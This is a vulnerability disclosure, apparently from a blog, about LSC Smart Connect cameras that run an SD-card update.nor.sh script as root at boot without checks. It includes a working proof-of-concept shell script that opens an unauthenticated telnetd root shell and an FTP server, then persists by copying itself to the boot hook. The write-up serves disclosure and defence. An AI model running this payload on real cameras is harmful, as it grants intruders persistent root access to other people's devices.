---
title: "Vulnerability Report: LSC Smart Connect Camera"
date: 2024-02-15
description: "Abusing the SD-card update hook to spawn remote shells on LSC Smart Connect cameras."
tags:
  - iot
  - vulnerability
  - cve
---

### Vulnerability Report on LSC Smart Connect Camera

The vulnerability found consists of exploiting the update system in `app_start.sh`, more precisely via the SD card mount and the `update.nor.sh` file.

#### Configuration Variables

```sh
# routines of sd-card
# /mnt is for backword compatible
SDC_DIR=/mnt
SDC_HOOK=$SDC_DIR/update.nor.sh
SDC_FLAG_DEBUG=$SDC_DIR/__ipc_debug.ini
TMP_HOOK=/tmp/update.nor.sh
SENSOR_ISP_HOOK=$SDC_DIR/ISP/*t23.bin
# debug core-dump
WHERE_COREDMP="/mnt/sdc/coredmp"
WHERE_EXEC="/usr/local/bin/doraemon"
```

#### Available Utilities

The exploit consists of creating a shell and opening a port via telnetd, which is present on the camera:

```sh
/bin # busybox --list
[...]
sh
sleep
swapoff
syslogd
tail
tar
tcpsvd
telnetd
[...]
```

#### Proof of Concept

We just need to write a .sh script to the SD card and name it update.nor.sh.

The exploit I choose is :

```sh
#!/bin/sh

telnetd -l /bin/sh -p 2323 &

echo "Telnet start by update.nor.sh" > /tmp/exploit_success

mkdir -p /tmp/ftp
echo "FTP server test" > /tmp/ftp/test.txt
ftpd -w /tmp/ftp -p 2121 &

cp /mnt/update.nor.sh /mnt/config/hook-boot.sh

date > /tmp/exploit_time
```

We connect via telnet:

![alt text](image.png)


## Conclusion

The device’s boot sequence reveals a systemic security gap rooted in unconditional trust of external and persistent storage. During startup, the system automatically mounts an SD card and executes any file named `update.nor.sh` with full root privileges, without performing integrity checks, authentication, or signature validation. This behavior effectively transforms removable media into an implicit root-level execution channel. Because this execution occurs before key services and safeguards are initialized, a malicious script can freely modify system behavior, disable protections, or extract sensitive information.

In parallel, the startup routine also executes `/mnt/config/hook-boot.sh` whenever present, again with no validation. Once an attacker gains initial code execution—via physical access, manipulated supply-chain media, or other vectors—they can write to the configuration partition and achieve seamless persistence across reboots. This makes the device highly susceptible to long-term compromise through a single dropped file.

Together, these design choices create a cascade of high-impact risks: trivial privilege escalation, pre-boot tampering, and durable persistence without requiring exploitation of system binaries or network exposure. As a result, anyone with access to removable storage or the configuration partition can subvert the entire security model of the device, implanting backdoors or disabling critical mechanisms with minimal effort. Addressing this vulnerability requires enforcing strict validation, limiting automatic code execution, and hardening the boot process against untrusted inputs.

